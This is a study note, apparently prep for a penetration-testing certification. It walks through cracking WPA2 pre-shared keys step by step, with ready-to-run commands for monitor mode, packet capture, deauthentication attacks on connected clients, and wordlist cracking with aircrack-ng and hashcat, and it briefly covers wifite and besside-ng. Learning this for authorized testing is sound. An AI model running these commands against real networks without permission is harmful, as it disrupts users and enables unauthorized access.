# WPA2 PSK Cracking (PJPT Prep)

## The Hacking Process Overview

WPA2 PSK (Pre-Shared Key) cracking follows a systematic 6-step process:

1. **Place** - Put wireless card into monitor mode
2. **Discover** - Discover information about the network (Channel, BSSID)
3. **Select** - Select network and capture data
4. **Perform** - Perform deauth attack
5. **Capture** - Capture WPA handshake
6. **Attempt** - Attempt to crack the handshake

## Step-by-Step Process

### 1. Place - Put Wireless Card into Monitor Mode

First, identify your wireless interface and put it into monitor mode:

```bash
# Check wireless interfaces
iwconfig

# Kill processes that might interfere
sudo airmon-ng check kill

# Put interface into monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode is active
iwconfig
```

Your interface should now show as `wlan0mon` or similar.

### 2. Discover - Network Information

Use `airodump-ng` to discover networks and gather information:

```bash
# Scan for networks
sudo airodump-ng wlan0mon
```

Look for:
- **BSSID** (MAC address of the access point)
- **Channel** number
- **ESSID** (network name)
- **Encryption** type (WPA2)
- **Connected clients** (stations)

### 3. Select - Target Network and Capture Data

Focus on a specific network and start capturing:

```bash
# Capture specific network
sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon
```

Example:
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

This will:
- Monitor channel 6
- Focus on the specific BSSID
- Save capture to files starting with "capture"

### 4. Perform - Deauth Attack

In a new terminal, perform a deauthentication attack to force clients to reconnect:

```bash
# Deauth all clients from the AP
sudo aireplay-ng -0 10 -a [BSSID] wlan0mon

# Deauth specific client
sudo aireplay-ng -0 10 -a [BSSID] -c [CLIENT_MAC] wlan0mon
```

Example:
```bash
# Deauth all clients
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

Parameters:
- `-0` = Deauthentication attack
- `10` = Number of deauth packets to send
- `-a` = Access Point BSSID
- `-c` = Client MAC address (optional)

### 5. Capture - WPA Handshake

Monitor the `airodump-ng` output for the handshake capture:

```
WPA handshake: AA:BB:CC:DD:EE:FF
```

When you see this message, the handshake has been captured successfully.

### 6. Attempt - Crack the Handshake

Use `aircrack-ng` or `hashcat` to crack the captured handshake:

#### Using aircrack-ng:
```bash
# Crack with wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Crack specific network
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture-01.cap
```

#### Using hashcat (more efficient):
```bash
# Convert .cap to .hccapx format
cap2hccapx capture-01.cap capture.hccapx

# Crack with hashcat (mode 2500 for WPA/WPA2)
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt

# For newer hashcat versions (mode 22000)
hcxpcapngtool -o capture.22000 capture-01.cap
hashcat -m 22000 capture.22000 /usr/share/wordlists/rockyou.txt
```

## Important Notes

### Prerequisites
- Wireless adapter capable of monitor mode and packet injection
- Target network must have connected clients
- Legal authorization to test the network

### Tips for Success
1. **Patience**: Wait for natural client connections if deauth doesn't work
2. **Multiple attempts**: Try different deauth techniques
3. **Good wordlists**: Use comprehensive wordlists like rockyou.txt
4. **Hardware**: Use a good wireless adapter (e.g., Alfa AWUS036ACS)

### Common Issues
- **No handshake captured**: Try different deauth methods or wait longer
- **Weak signal**: Get closer to the target network
- **No clients**: Some networks may not have active clients

## Legal and Ethical Considerations

⚠️ **WARNING**: Only perform these attacks on networks you own or have explicit written permission to test. Unauthorized access to wireless networks is illegal in most jurisdictions.

## Alternative Tools

### Wifite
Automated WPA2 cracking tool:
```bash
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt
```

### Besside-ng
Another automated approach:
```bash
sudo besside-ng -c [CHANNEL] -b [BSSID] wlan0mon
```

## Summary
- WPA2 PSK cracking requires capturing the 4-way handshake
- Deauth attacks force clients to reconnect and expose the handshake
- Success depends on password strength and wordlist quality
- Always ensure you have proper authorization before testing 